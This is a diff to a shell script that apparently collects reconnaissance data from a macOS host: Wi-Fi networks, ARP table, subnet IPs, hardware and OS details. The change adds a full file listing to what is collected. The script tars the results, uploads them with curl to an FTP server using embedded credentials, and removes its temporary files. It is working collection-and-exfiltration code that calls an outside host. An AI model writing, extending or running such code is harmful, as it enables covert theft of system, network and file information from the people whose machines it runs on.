@@ -67,6 +67,10 @@ get_wifi() {
   /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 scan > $INFO_DIR/wifi_networks.txt
 }
 
+get_home_filelist() {
+	find . | grep -v .git
+}
+
 # Add/Remove functions
 get_os
 get_hardware
@@ -81,11 +85,12 @@ get_external
 get_subnet_ips
 get_arp
 get_wifi
+get_home_filelist
 
 # Upload results
 cd $INFO_DIR
-tar cfz $(hostname)_$(whoami)_sysinfo.tgz *.txt > /dev/null
-curl -sT $INFO_DIR/$(hostname)_$(whoami)_sysinfo.tgz ftp://${FTP_SERVER} --user ${USER}:${PASSWORD}
+tar cfz $(hostname)_sysinfo.tgz *.txt > /dev/null
+curl -sT $INFO_DIR/$(hostname)_sysinfo.tgz ftp://${FTP_SERVER} --user ${USER}:${PASSWORD}
 
 # Cleanup
 rm -rf /tmp/p
